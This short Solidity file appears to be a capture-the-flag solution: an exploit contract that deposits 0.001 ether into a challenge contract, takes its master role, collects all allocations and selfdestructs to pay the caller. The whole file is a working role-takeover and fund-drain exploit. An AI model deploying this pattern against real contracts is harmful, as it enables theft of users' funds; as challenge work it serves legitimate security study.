// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.11;

import "hardhat/console.sol";

interface IChallenge_band0x {
    function allocate() external payable;

    function takeMasterRole() external;

    function collectAllocations() external;
}

contract Exploit_band0x {
    IChallenge_band0x instance;

    constructor(IChallenge_band0x _instance) payable {
        instance = _instance;
    }

    function finalize() external payable {
        require(msg.value == 0.001 ether, "wrong value");
        instance.allocate{value: msg.value}();
        instance.takeMasterRole();
        instance.collectAllocations();

        selfdestruct(payable(msg.sender));
    }

    receive() external payable {}
}
